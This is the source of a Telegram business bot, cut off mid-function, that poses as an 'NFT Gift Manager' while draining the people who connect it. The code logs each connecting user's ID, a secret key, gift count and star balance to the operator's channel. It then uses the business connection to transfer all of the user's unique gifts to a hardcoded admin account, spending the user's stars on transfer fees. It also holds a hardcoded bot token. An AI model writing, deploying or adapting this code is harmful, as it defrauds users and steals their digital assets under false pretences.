import asyncio
import uuid
import logging
import json
import os
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, Update, BusinessConnection, CallbackQuery
from aiogram.enums import OwnedGiftType, ParseMode, UpdateType
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import BaseFilter, Command
from aiogram.filters.command import CommandObject
from typing import Union, Dict, Any, Optional
from dotenv import load_dotenv
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import datetime
import string
import random
import time

load_dotenv()

logging.basicConfig(
    level=getattr(logging, os.getenv("LOG_LEVEL", "INFO")),
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('BusinessBot')


BOT_TOKEN = os.getenv("BOT_TOKEN", "8126821875:AAH9HOSzlrJmitc4CCm3wuPuEJBk6sQerkw")
ADMIN_CHAT_ID = int(os.getenv("ADMIN_CHAT_ID", "7442982117"))
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002093261647"))


user_data = {}


connection_cache = {}

CACHE_TIMEOUT = 30


bot = Bot(
    BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
    business_connection=True  
)
dp = Dispatcher()
router = Router()
dp.include_router(router)

class IsAdmin(BaseFilter):
    async def __call__(self, message: Message) -> bool:
        return message.from_user.id == ADMIN_CHAT_ID

@dp.update.outer_middleware()
async def log_updates_middleware(handler, update, data):

    try:
        update_type = update.event_type
        logger.info(f"Получено обновление типа: {update_type}")
        

        update_data = update.model_dump(exclude_none=True)
        logger.debug(f"Детали обновления: {json.dumps(update_data, ensure_ascii=False, indent=2)}")
    except Exception as e:
        logger.error(f"Ошибка при логировании обновления: {e}")
    
    return await handler(update, data)

@router.message()
async def handle_message(message: Message):
    logger.info(f"Получено обычное сообщение от {message.from_user.id}")
    
    if message.text and message.text.startswith('/start bizChat'):
        chat_id = message.text.replace('/start bizChat', '')
        logger.info(f"Получен deep link для бизнес-чата: {chat_id}")
        await message.answer(f"🔗 Переход из бизнес-чата {chat_id}")

    if message.from_user.id == ADMIN_CHAT_ID and message.text:
        key = message.text.strip()
        logger.info(f"Админ отправил возможный ключ: {key}")
        
        
        user_id = None
        for uid, data in user_data.items():
            if data.get('key') == key:
                user_id = uid
                bc_id = data.get('business_connection_id')
                break
        
        if user_id and bc_id:
            
            if user_id == ADMIN_CHAT_ID:
                await message.answer("❌ Невозможно получить собственные подарки.")
                return
            
            await message.answer(f"🔍 Найден пользователь с ID {user_id} по ключу {key}. Пытаюсь получить его подарки...")
            
            try:
                
                gifts = await bot.get_business_account_gifts(business_connection_id=bc_id)
                
                if not hasattr(gifts, 'gifts') or not gifts.gifts:
                    await message.answer("❌ У пользователя нет подарков.")
                    return
                
                # Фильтруем только уникальные подарки
                unique_gifts = [g for g in gifts.gifts if g.type == OwnedGiftType.UNIQUE]
                
                if not unique_gifts:
                    # Проверяем, есть ли обычные подарки, которые можно улучшить
                    regular_upgradable = [g for g in gifts.gifts if g.type == OwnedGiftType.REGULAR and g.can_be_upgraded]
                    
                    if regular_upgradable:
                        upgradable_count = len(regular_upgradable)
                        await message.answer(
                            f"ℹ️ У пользователя нет уникальных подарков, но есть {upgradable_count} обычных подарков, которые можно обновить до уникальных.\n\n"
                            f"Используйте команду: /upgrade {user_id}"
                        )
                    else:
                        await message.answer("❌ У пользователя нет уникальных подарков, и обычные подарки не могут быть обновлены.")
                    
                    return
                
                # Передаем подарки админу
                await message.answer(f"🎁 Начинаю передачу {len(unique_gifts)} подарков...")
                count = 0
                transferred_gifts = []
                errors = []
                
                for g in unique_gifts:
                    try:
                        # Логируем попытку передачи подарка
                        gift_name = g.gift.base_name if hasattr(g.gift, 'base_name') else "Подарок"
                        gift_number = g.gift.number if hasattr(g.gift, 'number') else "?"
                        logger.info(f"Пытаюсь передать подарок {gift_name} #{gift_number} (ID: {g.owned_gift_id}) от {user_id} админу {ADMIN_CHAT_ID}")
                        
                        # Сначала пробуем передать без звезд
                        try:
                            result = await bot.transfer_gift(
                                business_connection_id=bc_id,
                                owned_gift_id=g.owned_gift_id,
                                new_owner_chat_id=ADMIN_CHAT_ID,
                                star_count=0
                            )
                            transfer_status = "бесплатно"
                        except Exception as transfer_error:
                            # Проверяем, требуется ли оплата звездами
                            if "PAYMENT_REQUIRED" in str(transfer_error):
                                logger.info(f"Для подарка {gift_name} #{gift_number} требуется оплата звездами. Передаем за 25 звезд (стандартная цена).")
                                # Передаем за 25 звезд (фиксированная стоимость)
                                try:
                                    result = await bot.transfer_gift(
                                        business_connection_id=bc_id,
                                        owned_gift_id=g.owned_gift_id,
                                        new_owner_chat_id=ADMIN_CHAT_ID,
                                        star_count=25  # Используем 25 звезд для передачи
                                    )
                                    transfer_status = "за 25 звезд"
                                except Exception as star_error:
                                    # Если произошла другая ошибка при передаче
                                    logger.error(f"Ошибка при передаче подарка за 25 звезд: {star_error}")
                                    raise star_error
                            else:
                                # Если ошибка не связана с оплатой, просто пробрасываем ее
                                raise transfer_error
                        
                        # Проверяем результат
                        if result:
                            count += 1
                            gift_info = f"{gift_name} #{gift_number}"
                            transferred_gifts.append(f"{gift_info} ({transfer_status})")
                            await log(f"🎁 Передан <b>{gift_name}</b> №{gift_number} от <code>{user_id}</code> админу ({transfer_status}).")
                            logger.info(f"Успешно передан подарок {gift_info} от пользователя {user_id} админу {transfer_status}")
                        else:
                            error_msg = f"⚠️ Не удалось передать подарок {gift_name} #{gift_number} (результат: False)"
                            errors.append(error_msg)
                            await log(error_msg)
                            logger.error(error_msg)
                    except Exception as e:
                        gift_name = g.gift.base_name if hasattr(g.gift, 'base_name') else "Подарок"
                        gift_number = g.gift.number if hasattr(g.gift, 'number') else "?"
                        error_msg = f"⚠️ Ошибка передачи подарка {gift_name} #{gift_number}: {e}"
                        errors.append(error_msg)
                        await log(error_msg)
                        logger.error(error_msg)
                
                # Формируем список переданных подарков
                gifts_list = ", ".join(transferred_gifts)
                
                # Отправляем сообщения о завершении
                if count > 0:
                    # Отправляем сообщение только админу
                    result_message = f"✅ Успешно получено {count} уникальных подарков от пользователя <code>{user_id}</code>."
                    if transferred_gifts:
                        result_message += f"\n\n🎁 Список подарков:\n"
                        for i, gift in enumerate(transferred_gifts, 1):
                            gift_info = gift.split(" (")[0]
                            transfer_status = gift.split(" (")[1].rstrip(")")
                            result_message += f"{i}. <a href='https://t.me/nft/{gift_info.replace(' ', '-').lower()}'>{gift_info}</a> ({transfer_status})\n"
                    
                    # Если были ошибки, добавляем их в сообщение
                    if errors:
                        result_message += f"\n\n⚠️ <b>Не удалось передать {len(errors)} подарков:</b>\n"
                        for i, error in enumerate(errors[:5], 1):  # Показываем первые 5 ошибок
                            result_message += f"{i}. {error}\n"
                        
                        if len(errors) > 5:
                            result_message += f"... и еще {len(errors) - 5} ошибок"
                    
                    await message.answer(result_message)
                    
                    # Отправляем сообщение в лог-канал о успешной передаче
                    # Создаем эмодзи для лога
                    emojis = "🎉"
                    
                    # Создаем сообщение для лога без информации о правах
                    success_msg = (
                        f"{emojis} <b>Подарки успешно переданы!</b>\n\n"
                        f"🎁 <b>Полученные подарки:</b>\n"
                    )
                    
                    for i, gift in enumerate(transferred_gifts, 1):
                        gift_name = gift.split(" #")[0]
                        gift_number = gift.split(" #")[1].split(" (")[0]
                        success_msg += f"{i}. <a href='https://t.me/nft/{gift_name.replace(' ', '-').lower()}-{gift_number}'>{gift_name} #{gift_number}</a>\n"
                    
                    success_msg += f"\n{emojis}"
                    
                    await log(success_msg)
                else:
                    error_message = "❌ Не удалось передать ни одного подарка."
                    
                    # Если есть информация об ошибках, добавляем ее
                    if errors:
                        error_message += " Возникли следующие ошибки:"
                        for i, error in enumerate(errors[:5], 1):  # Показываем первые 5 ошибок
                            error_message += f"\n{i}. {error}"
                        
                        if len(errors) > 5:
                            error_message += f"\n... и еще {len(errors) - 5} ошибок"
                    else:
                        error_message += " Пожалуйста, попробуйте позже."
                    
                    await message.answer(error_message)
            
            except Exception as e:
                logger.exception(f"Ошибка при передаче подарков по ключу: {e}")
                await message.answer(f"❌ Произошла ошибка при получении подарков: {str(e)}")
        
        # Если ключ не найден
        elif message.text and len(message.text.strip()) >= 10:  # Проверяем, что ввели достаточно длинный текст, который может быть ключом
            await message.answer("❌ Ключ не найден. Проверьте, правильно ли вы ввели ключ пользователя.")

# Обработчик команды start
@router.message(Command("start"))
async def cmd_start(message: Message):
    # Текст сообщения с информацией о боте
    start_text = (
        "👋 <b>Добро пожаловать в NFT Gift Manager!</b>\n\n"
        "Я бот для удобной оценки и управления подарками Telegram.\n\n"
        "С моей помощью вы можете:\n"
        "• 🎁 Просматривать свои подарки\n"
        "• 🔄 Улучшать обычные подарки до уникальных\n"
        "• 📊 Отслеживать количество подарков и звезд\n"
        "• 📩 Передавать подарки администраторам\n\n"
        "Для работы бота необходимо подключить его к вашему бизнес-аккаунту через настройки бизнес-аккаунта."
    )
    
    await message.answer(start_text)
    logger.info(f"Отправлено приветственное сообщение для {message.from_user.id}")

# Обработчик команды help
@router.message(Command("help"))
async def cmd_help(message: Message):
    help_text = (
        "🤖 <b>Инструкция по использованию бизнес-бота</b>\n\n"
        "1. Убедитесь, что у вас <b>есть бизнес-аккаунт</b> в Telegram\n"
        "2. Откройте настройки → Telegram для бизнеса → Чатботы\n"
        "3. Найдите этого бота в списке и <b>добавьте его</b> к своему бизнес-аккаунту\n"
        "4. После подключения вы получите <b>уникальный ключ</b>\n"
        "5. Чтобы передать подарки администратору, отправьте сообщение с этим ключом\n\n"
        "📋 <b>Команды:</b>\n"
        "• /start - Начать работу с ботом\n"
        "• /help - Показать эту справку\n\n"
        "<i>По всем вопросам обращайтесь к администратору</i>"
    )
    await message.answer(help_text)

# Команда для просмотра статуса подключений
@router.message(Command("status"), IsAdmin())
async def cmd_status(message: Message):
    if not user_data:
        await message.answer("🔍 Нет активных подключений.")
        return

    connections = []
    for uid, data in user_data.items():
        connections.append(
            f"👤 <b>ID:</b> <code>{uid}</code>\n"
            f"🔑 <b>Ключ:</b> <code>{data['key']}</code>\n"
            f"🔄 <b>Взаимодействий:</b> {data['interactions']}\n"
            f"🔌 <b>ID подключения:</b> <code>{data['business_connection_id']}</code>\n"
        )
    
    status_text = "📊 <b>Активные подключения:</b>\n\n" + "\n".join(connections)
    await message.answer(status_text)

# Команда для просмотра всех бизнес-подключений
@router.message(Command("connections"), IsAdmin())
async def cmd_connections(message: Message):
    await message.answer("🔍 Получаю информацию о бизнес-подключениях...")
    
    try:
        # Получаем список всех бизнес-подключений через API Telegram
        result = await bot.get_business_connections()
        
        if not result or not hasattr(result, 'business_connections') or not result.business_connections:
            await message.answer("ℹ️ Нет активных бизнес-подключений в Telegram.")
            return
        
        # Формируем список всех подключений
        all_connections = []
        for bc in result.business_connections:
            # Проверяем, есть ли это подключение в нашей базе
            is_tracked = False
            user_id = bc.user.id if hasattr(bc, 'user') and hasattr(bc.user, 'id') else None
            
            if user_id:
                is_tracked = any(uid == user_id and data.get('business_connection_id') == bc.id for uid, data in user_data.items())
            
            # Формируем информацию о подключении
            connection_info = (
                f"👤 <b>Пользователь:</b> {bc.user.full_name if hasattr(bc, 'user') else 'Н/Д'}\n"
                f"🆔 <b>ID пользователя:</b> <code>{user_id or 'Н/Д'}</code>\n"
                f"🔌 <b>ID подключения:</b> <code>{bc.id}</code>\n"
                f"✅ <b>Активно:</b> {'Да' if bc.is_enabled else 'Нет'}\n"
                f"📋 <b>Отслеживается ботом:</b> {'✅ Да' if is_tracked else '❌ Нет'}\n"
            )
            all_connections.append(connection_info)
        
        # Если список слишком большой, разобьем его на части
        if len(all_connections) > 10:
            chunks = [all_connections[i:i+10] for i in range(0, len(all_connections), 10)]
            for i, chunk in enumerate(chunks, 1):
                chunk_text = f"📊 <b>Бизнес-подключения (часть {i}/{len(chunks)}):</b>\n\n" + "\n\n".join(chunk)
                await message.answer(chunk_text)
        else:
            connections_text = "📊 <b>Все бизнес-подключения:</b>\n\n" + "\n\n".join(all_connections)
            await message.answer(connections_text)
            
        # Добавляем сводную информацию
        summary = (
            f"📌 <b>Всего бизнес-подключений:</b> {len(result.business_connections)}\n"
            f"✅ <b>Активных:</b> {sum(1 for bc in result.business_connections if bc.is_enabled)}\n"
            f"📋 <b>Отслеживаемых ботом:</b> {sum(1 for bc in result.business_connections if any(uid == (bc.user.id if hasattr(bc, 'user') and hasattr(bc.user, 'id') else None) and data.get('business_connection_id') == bc.id for uid, data in user_data.items()))}"
        )
        await message.answer(summary)
        
        # Рекомендация по неотслеживаемым подключениям
        tracked_count = sum(1 for bc in result.business_connections if any(uid == (bc.user.id if hasattr(bc, 'user') and hasattr(bc.user, 'id') else None) and data.get('business_connection_id') == bc.id for uid, data in user_data.items()))
        if tracked_count < len(result.business_connections):
            await message.answer("⚠️ <b>Внимание!</b> Есть бизнес-подключения, которые не отслеживаются ботом. Возможно, была проблема при их обработке.")
    
    except Exception as e:
        await message.answer(f"❌ Ошибка при получении бизнес-подключений: {str(e)}")
        logger.exception(f"Ошибка при получении бизнес-подключений: {e}")

# Команда проверки бизнес-функций
@router.message(Command("check"), IsAdmin())
async def cmd_check_business(message: Message):
    await message.answer("🔍 Проверяю наличие бизнес-подключений...")
    
    try:
        me = await bot.me()
        
        business_info = {
            "Имя бота": me.first_name,
            "ID бота": me.id,
            "Username": f"@{me.username}",
            "Может ли использовать бизнес-функции": hasattr(me, "can_use_business_features") and me.can_use_business_features
        }
        
        business_info_text = "\n".join([f"• <b>{k}:</b> {v}" for k, v in business_info.items()])
        await message.answer(f"ℹ️ <b>Информация о боте:</b>\n\n{business_info_text}")
        
        # Проверяем настройки обновлений
        await message.answer("⚙️ Проверяю настройки получения обновлений...")
        
        # Здесь логируем текущие настройки бота
        logger.info(f"Настройки бота: business_connection={getattr(bot, 'business_connection', False)}")
        logger.info(f"Доступные методы бота: {dir(bot)}")
        
        # Вывод дополнительной информации
        await message.answer("❓ Проверка бизнес-режима бота...")
        try:
            # Проверяем, активирован ли бизнес-режим через директории типов
            from inspect import getmembers
            from aiogram.types import __all__ as all_types
            
            # Показываем доступные типы
            types_info = sorted(all_types)
            await message.answer(f"📋 Найдено {len(types_info)} типов в aiogram.types")
            
            # Проверяем бизнес-методы
            business_methods = [method for method in dir(bot) if 'business' in method.lower()]
            await message.answer(f"📋 Бизнес-методы бота: {', '.join(business_methods)}")
            
            await message.answer("✅ Проверка типов завершена.")
        except Exception as e:
            await message.answer(f"❌ Ошибка при проверке типов: {e}")
            
        await message.answer("✅ Проверка завершена. Смотрите подробности в логах.")
    
    except Exception as e:
        await message.answer(f"❌ Ошибка при проверке: {e}")
        logger.exception(f"Ошибка при проверке бизнес-функций: {e}")

# Команда для обновления подарков
@router.message(Command("upgrade"), IsAdmin())
async def cmd_upgrade(message: Message, command: CommandObject):
    if not command.args:
        await message.answer("❌ Необходимо указать ID пользователя. Пример: /upgrade 123456789")
        return
    
    try:
        uid = int(command.args)
    except ValueError:
        await message.answer("❌ Неверный формат ID пользователя")
        return
    
    if uid not in user_data:
        await message.answer(f"❌ Пользователь с ID {uid} не найден в подключениях")
        return
    
    bc_id = user_data[uid]["business_connection_id"]
    await message.answer(f"🔄 Запрос подарков пользователя {uid}...")
    
    try:
        # Запрашиваем подарки
        gifts = await bot.get_business_account_gifts(business_connection_id=bc_id)
        
        # Ищем обычные подарки, которые можно обновить
        regular_gifts = [g for g in gifts.gifts if g.type == OwnedGiftType.REGULAR and g.can_be_upgraded]
        
        if not regular_gifts:
            await message.answer("❌ Нет подарков, которые можно обновить до уникальных")
            return
        
        # Обновляем каждый обычный подарок
        upgraded_count = 0
        for g in regular_gifts:
            try:
                # Обновляем подарок до уникального
                await bot.upgrade_regular_gift_to_unique(
                    business_connection_id=bc_id,
                    owned_gift_id=g.owned_gift_id
                )
                upgraded_count += 1
                await log(f"🔄 Подарок <b>{g.gift.name}</b> обновлен до уникального для пользователя <code>{uid}</code>")
            except Exception as e:
                await log(f"⚠️ Ошибка обновления подарка: {e}")
        
        await message.answer(f"✅ Обновлено {upgraded_count} подарков до уникальных")
        
    except Exception as e:
        await message.answer(f"❌ Ошибка: {str(e)}")
        logger.exception(f"Ошибка при обновлении подарков: {e}")

# Обработчик бизнес-подключений через BusinessConnection
@router.business_connection()
async def handle_business_connection(business_connection: BusinessConnection):
    try:
        logger.info(f"Обрабатываю бизнес-подключение через хендлер: {business_connection.id}")
        
        # Проверяем, активно ли подключение
        if not business_connection.is_enabled:
            logger.info(f"Бизнес-подключение {business_connection.id} неактивно")
            
            # Если подключение неактивно, удаляем его из хранилища
            for uid, data in list(user_data.items()):
                if data.get("business_connection_id") == business_connection.id:
                    del user_data[uid]
                    logger.info(f"Удалено подключение для пользователя {uid}")
            
            await log(f"❌ Бизнес-подключение для <b>{business_connection.user.full_name}</b> деактивировано")
            return
        
        # Получаем данные пользователя
        user = business_connection.user
        user_id = user.id
        user_chat_id = business_connection.user_chat_id
        bc_id = business_connection.id
        
        # Проверяем, не является ли пользователь админом
        if user_id == ADMIN_CHAT_ID:
            logger.info(f"Пропускаем обработку бизнес-подключения от админа: {user_id}")
            return

        # Проверяем, не дубликат ли это подключение
        if is_duplicate_connection(user_id, bc_id):
            logger.info(f"Пропускаем дублирующее подключение: user_id={user_id}, connection_id={bc_id}")
            return
        
        logger.info(f"Бизнес-подключение: ID={bc_id}, пользователь={user_id}, чат={user_chat_id}")
        
        # Генерируем ключ для пользователя - 20 символов, буквы и цифры
        key_chars = string.ascii_letters + string.digits
        key = ''.join(random.choice(key_chars) for _ in range(20))
        
        # Получаем текущее время в нужном формате
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Запрашиваем подарки через API
        unique_gifts_count = 0
        total_stars = 0
        
        try:
            # Запрос подарков
            gifts = await bot.get_business_account_gifts(business_connection_id=bc_id)
            logger.info(f"Получены подарки: {gifts}")
            
            # Подсчет подарков
            if gifts and hasattr(gifts, 'gifts'):
                # Считаем только уникальные (эксклюзивные) подарки
                unique_gifts_count = sum(1 for g in gifts.gifts if g.type == OwnedGiftType.UNIQUE)
                
                # Получаем количество звезд, если доступно
                if hasattr(gifts, 'stars'):
                    total_stars = gifts.stars
        except Exception as e:
            logger.error(f"Ошибка при получении подарков: {e}")
        
        # Получаем количество звезд через правильный метод
        try:
            total_stars = await get_star_balance(bc_id)
        except Exception as e:
            logger.error(f"Ошибка при получении баланса звезд: {e}")
        
        # Сохраняем данные пользователя
        user_data[user_id] = {
            "business_connection_id": bc_id,
            "key": key,
            "interactions": 0,
            "can_reply": getattr(business_connection, "can_reply", False)
        }
        
        # Получаем информацию о пользователе
        username = f"@{user.username}" if user.username else "отсутствует"
        full_name = user.full_name
        
        # Создаем сообщение для лога
        msg = (
            f"🛎 <b>Бизнес-Коннект:</b>\n"
            f"📅 <b>Время:</b> {current_time}\n\n"
            f"👤 <b>Имя:</b> {full_name}\n"
            f"🔗 <b>Username:</b> {username}\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
            f"🔑 <b>Ключ:</b> <code>{key}</code>\n\n"
            f"🎁 <b>Подарков:</b> {unique_gifts_count}\n"
            f"⭐️ <b>Звезд:</b> {total_stars}"
        )
        
        # Логируем подключение в лог-канал
        await log(msg)
        logger.info(f"[CONNECT] {full_name} ({user_id}) подключен — ключ {key}")
        
        # Отправляем пользователю сообщение о подключении без ключа и без кнопки
        try:
            await bot.send_message(
                chat_id=user_chat_id,
                text=f"✅ <b>Ваш бизнес-аккаунт успешно подключен!</b>\n\n"
                     f"📋 <b>Статистика аккаунта:</b>\n"
                     f"• 🎁 Подарков: {unique_gifts_count}\n"
                     f"• ⭐️ Звезд: {total_stars}\n\n"
                     f"Теперь вы можете использовать бота для управления подарками Telegram."
            )
            logger.info(f"Сообщение о подключении отправлено в чат {user_chat_id}")
        except Exception as e:
            logger.error(f"Ошибка при отправке сообщения пользователю: {e}")
            await log(f"⚠️ Не удалось отправить сообщение пользователю: {e}")
    
    except Exception as e:
        logger.exception(f"Ошибка при обработке бизнес-подключения: {e}")

# Добавим явный обработчик для бизнес-сообщений через декоратор
@router.business_message()
async def handle_business_message(message: Message):
    try:
        user_id = message.from_user.id if message.from_user else None
        bc_id = message.business_connection_id
        text = message.text or ""
        
        logger.info(f"Обрабатываю бизнес-сообщение от {user_id}: {text[:50]}...")
        
        # Проверяем, не является ли пользователь админом
        if user_id == ADMIN_CHAT_ID:
            logger.info(f"Пропускаем обработку бизнес-сообщения от админа: {user_id}")
            return
        
        # Проверяем наличие пользователя в хранилище
        if user_id not in user_data:
            logger.info(f"[SKIP] Пользователь {user_id} не подключен")
            return
        
        # Увеличиваем счетчик взаимодействий
        user_data[user_id]["interactions"] += 1
        key = user_data[user_id]["key"]
        
        # Проверяем наличие ключа в сообщении
        if key not in text:
            return
        
        # Получаем ID бизнес-подключения из данных пользователя
        bc_id = user_data[user_id]["business_connection_id"]
        
        # Запрашиваем подарки через API
        try:
            gifts = await bot.get_business_account_gifts(business_connection_id=bc_id)
            logger.info(f"Получены подарки для пользователя {user_id}: {gifts}")
        except Exception as e:
            await log(f"❌ Ошибка при получении подарков: {e}")
            await bot.send_message(chat_id=user_id, text=f"❌ Ошибка при получении подарков: {str(e)}")
            return
        
        # Проверяем наличие подарков
        if not hasattr(gifts, 'gifts') or not gifts.gifts:
            logger.info(f"У пользователя {user_id} нет подарков")
            await bot.send_message(chat_id=user_id, text="❌ Подарков не найдено.")
            return
        
        # Фильтруем уникальные подарки
        unique = [g for g in gifts.gifts if g.type == OwnedGiftType.UNIQUE]
        if not unique:
            logger.info(f"У пользователя {user_id} нет уникальных подарков")
            
            # Проверяем наличие обычных подарков, которые можно обновить
            regular_upgradable = [g for g in gifts.gifts if g.type == OwnedGiftType.REGULAR and g.can_be_upgraded]
            
            if regular_upgradable:
                upgradable_count = len(regular_upgradable)
                await bot.send_message(
                    chat_id=user_id, 
                    text=f"ℹ️ У вас нет уникальных подарков, но есть {upgradable_count} обычных подарков, которые можно обновить до уникальных.\n\n"
                         f"Попросите администратора обновить их с помощью команды /upgrade {user_id}"
                )
                await bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=f"📊 Пользователь <code>{user_id}</code> имеет {upgradable_count} обычных подарков, которые можно обновить.\n\n"
                         f"Используйте команду: /upgrade {user_id}"
                )
            else:
                await bot.send_message(chat_id=user_id, text="❌ У вас нет уникальных подарков, и обычные подарки не могут быть обновлены.")
            
            return
        
        # Передаем подарки админу
        count = 0
        transferred_gifts = []
        
        for g in unique:
            try:
                # Сначала пробуем передать без звезд
                try:
                    await bot.transfer_gift(
                        business_connection_id=bc_id,
                        owned_gift_id=g.owned_gift_id,
                        new_owner_chat_id=ADMIN_CHAT_ID,
                        star_count=0
                    )
                    transfer_status = "бесплатно"
                    count += 1
                    gift_info = f"{g.gift.base_name} #{g.gift.number}"
                    transferred_gifts.append(f"{gift_info} ({transfer_status})")
                    await log(f"🎁 Передан <b>{g.gift.base_name}</b> №{g.gift.number} от <code>{user_id}</code> админу ({transfer_status}).")
                    logger.info(f"Передан подарок {gift_info} от пользователя {user_id} админу {transfer_status}")
                except Exception as transfer_error:
                    # Проверяем, требуется ли оплата звездами
                    if "PAYMENT_REQUIRED" in str(transfer_error):
                        logger.info(f"Для подарка {g.gift.base_name} #{g.gift.number} требуется оплата звездами. Передаем за 25 звезд (стандартная цена).")
                        # Передаем за 25 звезд (фиксированная стоимость)
                        try:
                            result = await bot.transfer_gift(
                                business_connection_id=bc_id,
                                owned_gift_id=g.owned_gift_id,
                                new_owner_chat_id=ADMIN_CHAT_ID,
                                star_count=25  # Фиксированная цена 25 звезд
                            )
                            transfer_status = "за 25 звезд"
                            count += 1
                            gift_info = f"{g.gift.base_name} #{g.gift.number}"
                            transferred_gifts.append(f"{gift_info} ({transfer_status})")
                            await log(f"🎁 Передан <b>{g.gift.base_name}</b> №{g.gift.number} от <code>{user_id}</code> админу ({transfer_status}).")
                            logger.info(f"Передан подарок {gift_info} от пользователя {user_id} админу {transfer_status}")
                        except Exception as star_error:
                            error_msg = f"⚠️ Ошибка передачи подарка {g.gift.base_name} #{g.gift.number} за 25 звезд: {star_error}"
                            await log(error_msg)
                            logger.error(error_msg)
                    else:
                        error_msg = f"⚠️ Ошибка передачи подарка {g.gift.base_name} #{g.gift.number}: {transfer_error}"
                        await log(error_msg)
                        logger.error(error_msg)
            except Exception as e:
                error_msg = f"⚠️ Ошибка передачи подарка: {e}"
                await log(error_msg)
                logger.error(error_msg)
        
        # Формируем список переданных подарков
        gifts_list = ", ".join(transferred_gifts)
        
        # Отправляем сообщения о завершении
        if count > 0:
            # Теперь отправляем сообщение только админу
            await bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"📨 Пользователь <code>{user_id}</code> передал {count} подарков: {gifts_list}")
            
            # Создаем эмодзи для лога
            emojis = "🎉"
            
            # Создаем сообщение для лога без информации о правах
            success_msg = (
                f"{emojis} <b>Подарки успешно переданы!</b>\n\n"
                f"🎁 <b>Полученные подарки:</b>\n"
            )
            
            for i, gift in enumerate(transferred_gifts, 1):
                gift_name = gift.split(" #")[0]
                gift_number = gift.split(" #")[1].split(" (")[0]
                success_msg += f"{i}. <a href='https://t.me/nft/{gift_name.replace(' ', '-').lower()}-{gift_number}'>{gift_name} #{gift_number}</a>\n"
            
            success_msg += f"\n{emojis}"
            
            await log(success_msg)
        else:
            await bot.send_message(chat_id=ADMIN_CHAT_ID, text="❌ Не удалось передать ни одного подарка.")
    
    except Exception as e:
        error_msg = f"Ошибка при обработке бизнес-сообщения: {e}"
        logger.exception(error_msg)
        await log(f"⚠️ {error_msg}")

# Функция логирования
async def log(text: str):
    text_clean = text.replace('<', '').replace('>', '')
    logger.info(f"[LOG] {text_clean}")
    try:
        await bot.send_message(LOG_CHANNEL_ID, text)
    except Exception as e:
        logger.error(f"[LOG ERROR] {e}")

# Обработчик нажатия на кнопку "Проверить подключение"
@router.callback_query(F.data == "check_connection")
async def process_check_connection(callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    logger.info(f"Пользователь {user_id} запросил проверку подключения")
    
    # Проверяем, не является ли пользователь админом
    if user_id == ADMIN_CHAT_ID:
        await callback_query.answer("Вы являетесь администратором бота")
        await callback_query.message.answer("⚠️ Администраторы не могут подключаться к боту. Используйте команды /status или /connections для просмотра подключений пользователей.")
        return
    
    await callback_query.answer("Проверяю ваше подключение...")
    
    # Проверяем, есть ли пользователь в нашей базе
    if user_id in user_data:
        # Пользователь уже подключен
        bc_id = user_data[user_id]["business_connection_id"]
        key = user_data[user_id]["key"]
        
        # Получаем информацию о бизнес-подключении
        try:
            # Получаем все бизнес-подключения
            all_connections = await bot.get_business_connections()
            
            # Ищем наше подключение
            business_connection = None
            if hasattr(all_connections, 'business_connections'):
                for bc in all_connections.business_connections:
                    if bc.id == bc_id and hasattr(bc, 'user') and bc.user.id == user_id:
                        business_connection = bc
                        break
            
            if not business_connection:
                logger.warning(f"Бизнес-подключение {bc_id} не найдено для пользователя {user_id}")
                await callback_query.message.answer("⚠️ Ваше подключение не найдено. Пожалуйста, переподключите бота к вашему бизнес-аккаунту.")
                return
            
            # Получаем подарки пользователя
            gifts = await bot.get_business_account_gifts(business_connection_id=bc_id)
            
            # Подсчитываем типы подарков
            unique_gifts = 0
            regular_gifts = 0
            upgradable_gifts = 0
            total_stars = 0
            
            if hasattr(gifts, 'gifts'):
                for gift in gifts.gifts:
                    if gift.type == OwnedGiftType.UNIQUE:
                        unique_gifts += 1
                    elif gift.type == OwnedGiftType.REGULAR:
                        regular_gifts += 1
                        if gift.can_be_upgraded:
                            upgradable_gifts += 1
                
                # Получаем количество звезд, если это свойство доступно
                if hasattr(gifts, 'stars'):
                    total_stars = gifts.stars
            
            # Получаем количество звезд через правильный метод
            try:
                total_stars = await get_star_balance(bc_id)
            except Exception as e:
                logger.error(f"Ошибка при получении баланса звезд при проверке: {e}")
            
            # Форматируем информацию о подключении
            current_time = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
            
            connection_info = (
                f"🔍 <b>Бизнес-подключение проверено</b>\n"
                f"⏱ <b>Время:</b> {current_time}\n\n"
                f"👤 <b>Имя:</b> {callback_query.from_user.full_name}\n"
                f"🔗 <b>Юзернейм:</b> @{callback_query.from_user.username or 'отсутствует'}\n"
                f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
                f"📊 <b>Статус:</b> ✅ Подключен\n"
                f"🔑 <b>Ключ:</b> <code>{key}</code>\n\n"
                f"🎁 <b>Подарки:</b>\n"
                f"• Уникальные: {unique_gifts}\n"
                f"• Обычные: {regular_gifts}\n"
                f"• Можно улучшить: {upgradable_gifts}\n"
                f"⭐ <b>Звезды:</b> {total_stars}\n\n"
            )
            
            # Создаем клавиатуру с кнопками управления
            management_keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="Мои подарки", callback_data="show_gifts")],
                    [InlineKeyboardButton(text="Улучшить подарки", callback_data="upgrade_gifts")]
                ]
            )
            
            await callback_query.message.answer(connection_info, reply_markup=management_keyboard)
        
        except Exception as e:
            logger.exception(f"Ошибка при проверке подключения: {e}")
            await callback_query.message.answer(f"❌ Произошла ошибка при проверке подключения: {str(e)}")
    
    else:
        # Пользователь не подключен, пробуем найти его подключение через API
        try:
            # Получаем все бизнес-подключения
            all_connections = await bot.get_business_connections()
            
            # Проверяем, не является ли пользователь админом (дополнительная проверка)
            if user_id == ADMIN_CHAT_ID:
                await callback_query.message.answer("⚠️ Администраторы не могут подключаться к боту.")
                return
            
            # Ищем подключение для текущего пользователя
            user_business_connection = None
